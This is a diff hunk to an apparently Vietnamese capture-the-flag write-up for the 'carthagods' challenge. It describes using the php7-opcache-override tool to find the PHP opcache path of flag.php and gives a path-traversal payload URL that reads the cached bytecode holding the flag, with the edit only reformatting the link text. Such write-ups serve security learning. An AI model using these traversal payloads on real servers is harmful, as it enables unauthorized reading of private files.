@@ -71,7 +71,7 @@ Ta có thể dùng [php7-opcache-override](https://github.com/GoSecure/php7-opca
 
 Dùng script của [php7-opcache-override](https://github.com/GoSecure/php7-opcache-override) ta lấy được system_id. Vậy thế vào ta có đường dẫn file cache của `flag.php` là: **`/var/www/cache/e2c6579e4df1d9e77e36d2f4ff8c92b3/var/www/html/flag.php.bin`**
 
-Payload: [http://carthagods.3k.ctf.to:8039/?eba1b61134bf5818771b8c3203a16dc9=**../../../../var/www/cache/e2c6579e4df1d9e77e36d2f4ff8c92b3/var/www/html/flag.php.bin**](http://carthagods.3k.ctf.to:8039/?eba1b61134bf5818771b8c3203a16dc9=../../../../var/www/cache/e2c6579e4df1d9e77e36d2f4ff8c92b3/var/www/html/flag.php.bin)
+Payload: [../../../../var/www/cache/e2c6579e4df1d9e77e36d2f4ff8c92b3/var/www/html/flag.php.bin](http://carthagods.3k.ctf.to:8039/?eba1b61134bf5818771b8c3203a16dc9=../../../../var/www/cache/e2c6579e4df1d9e77e36d2f4ff8c92b3/var/www/html/flag.php.bin)
 
 Và ta đã lấy được nội dung file `flag.php` dưới dạng bytecode và có chứa flag
 
